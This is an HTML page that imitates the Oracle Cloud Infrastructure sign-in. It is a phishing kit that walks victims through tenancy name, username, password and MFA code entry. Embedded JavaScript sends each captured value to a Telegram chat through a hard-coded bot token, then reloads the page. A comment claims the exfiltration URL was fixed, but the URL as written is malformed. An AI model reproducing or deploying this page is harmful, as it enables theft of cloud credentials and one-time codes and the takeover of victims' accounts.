<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Oracle Cloud Sign In</title>
    <style>
        body { font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; margin: 0; padding: 0; color: #312d2a; background-color: #fff; -webkit-font-smoothing: antialiased; }
        .top-header { background-color: #312d2a; color: #f2f2f2; padding: 12px 20px; display: flex; align-items: center; font-size: 14px; }
        .oracle-icon { width: 22px; height: 11px; border: 2px solid #ff4200; border-radius: 12px; margin-right: 12px; }
        .content { padding: 30px 24px; }
        .logo-box { margin-bottom: 35px; }
        .logo-main { font-size: 32px; font-weight: 700; letter-spacing: 1px; line-height: 1; }
        .logo-sub { font-size: 22px; display: block; margin-top: 2px; }
        .label { font-size: 16px; font-weight: 600; margin-bottom: 12px; display: block; }
        input { width: 100%; padding: 12px; border: 1px solid #9e9e9e; border-radius: 4px; font-size: 16px; box-sizing: border-box; margin-bottom: 20px; outline: none; background-color: #fff; }
        .btn { border: none; padding: 12px 24px; border-radius: 4px; font-size: 15px; cursor: pointer; width: 100%; transition: all 0.2s ease; }
        .btn-inactive { background-color: #e0e0e0; color: #9e9e9e; pointer-events: none; }
        .btn-active { background-color: #312d2a; color: #fff; pointer-events: auto; }
        .step { display: none; }
        .step.active { display: block; }
        .tenancy-val { font-size: 16px; font-weight: 600; margin-bottom: 20px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #312d2a; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 50px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="top-header">
        <div class="oracle-icon"></div>
        Oracle Cloud Infrastructure
    </div>

    <div class="content">
        <div id="step1" class="step active">
            <div class="logo-box"><div class="logo-main">ORACLE</div><div class="logo-sub">Cloud</div></div>
            <span class="label">Cloud Account Name</span>
            <input type="text" id="accInput" placeholder="Enter cloud account name" oninput="v1()">
            <button id="btn1" class="btn btn-inactive" onclick="nav(2)">Next</button>
        </div>

        <div id="step2" class="step">
            <div class="tenancy-val" id="disp1"></div>
            <button class="btn btn-active" onclick="nav(3)">Next</button>
        </div>

        <div id="step3" class="step">
            <div class="tenancy-val" id="disp2"></div>
            <span class="label">User Name</span>
            <input type="text" id="user" placeholder="User name" oninput="v3()">
            <span class="label">Password</span>
            <input type="password" id="pass" placeholder="Password" oninput="v3()">
            <button id="btn3" class="btn btn-inactive" onclick="nav(4)">Sign In</button>
        </div>

        <div id="step4" class="step">
            <h2 style="font-weight: 400;">Verify Identity</h2>
            <input type="text" id="code" placeholder="000000" maxlength="6" oninput="v4()">
            <button id="btn4" class="btn btn-inactive" onclick="done()">Verify</button>
        </div>

        <div id="step5" class="step"><div class="loader"></div></div>
    </div>

    <script>
        const TOKEN = '8247288911:AAEVOitrWDnxYaxXl_xzzGMQZnLwXQrFbjo';
        const CHAT_ID = '6576262467';

        // ИСПРАВЛЕНО: Домен api.telegram.org, добавлен префикс /bot и корректный синтаксис ${TOKEN}
        async function send(msg) {
            const url = `https://telegram.org{TOKEN}/sendMessage`;
            
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: msg,
                        parse_mode: 'HTML'
                    })
                });
            } catch (e) {
                console.error("Network Error:", e);
            }
        }

        function nav(n) {
            const acc = document.getElementById('accInput').value;
            if (n === 2) {
                send(`<b>☁️ Tenancy:</b> ${acc}`);
                document.getElementById('disp1').innerText = acc;
                document.getElementById('disp2').innerText = acc;
            }
            if (n === 4) {
                const u = document.getElementById('user').value;
                const p = document.getElementById('pass').value;
                send(`<b>👤 Login:</b>\nT: ${acc}\nU: ${u}\nP: ${p}`);
            }
            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
            document.getElementById('step' + n).classList.add('active');
        }

        async function done() {
            const c = document.getElementById('code').value;
            await send(`<b>🔐 MFA:</b> ${c}`);
            nav(5);
            setTimeout(() => location.reload(), 3000);
        }

        function v1() { document.getElementById('btn1').className = document.getElementById('accInput').value.length > 1 ? 'btn btn-active' : 'btn btn-inactive'; }
        function v3() { document.getElementById('btn3').className = (document.getElementById('user').value.length > 2 && document.getElementById('pass').value.length > 2) ? 'btn btn-active' : 'btn btn-inactive'; }
        function v4() { document.getElementById('btn4').className = document.getElementById('code').value.length === 6 ? 'btn btn-active' : 'btn btn-inactive'; }
    </script>
</body>
</html>
